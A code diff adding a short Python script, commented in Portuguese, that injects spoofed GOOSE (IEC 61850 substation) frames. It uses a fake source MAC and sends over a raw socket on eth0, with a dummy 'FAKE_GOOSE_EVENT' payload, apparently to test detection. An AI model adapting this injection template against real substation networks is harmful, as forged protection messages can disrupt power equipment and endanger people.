@@ -1,0 +1,26 @@
+import socket
+import time
+
+iface = "eth0"
+
+# destino multicast GOOSE
+dst_mac = bytes.fromhex("01 0c cd 01 00 01")
+
+# MAC falso, não pertencente a IED
+src_mac = bytes.fromhex("02 42 aa bb cc dd")
+
+# EtherType GOOSE
+eth_type = (0x88B8).to_bytes(2, "big")
+
+payload = b"FAKE_GOOSE_EVENT"
+
+frame = dst_mac + src_mac + eth_type + payload
+
+s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
+s.bind((iface, 0))
+
+print("Enviando GOOSE falso...")
+for _ in range(20):
+    s.send(frame)
+    time.sleep(0.1)
+print("Done.")
